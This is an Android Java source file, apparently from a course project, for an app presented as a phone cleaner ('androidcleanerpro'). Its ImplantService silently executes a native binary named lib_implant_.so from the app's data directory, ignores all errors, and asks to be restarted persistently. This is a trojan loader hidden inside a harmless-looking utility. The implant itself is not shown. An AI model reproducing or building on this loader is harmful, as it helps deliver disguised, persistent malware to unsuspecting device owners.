package sx.root.cs4001.androidcleanerpro;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.support.annotation.Nullable;

public class ImplantService extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        PackageManager m = getPackageManager();
        String s = getPackageName();

        try {
            PackageInfo p = m.getPackageInfo(s, 0);
            s = p.applicationInfo.dataDir;
        } catch (PackageManager.NameNotFoundException e) {}

        try {
            Process process = Runtime.getRuntime().exec(s + "/lib/lib_implant_.so " + s);
        } catch (java.io.IOException e) {}

        return START_STICKY;
    }
}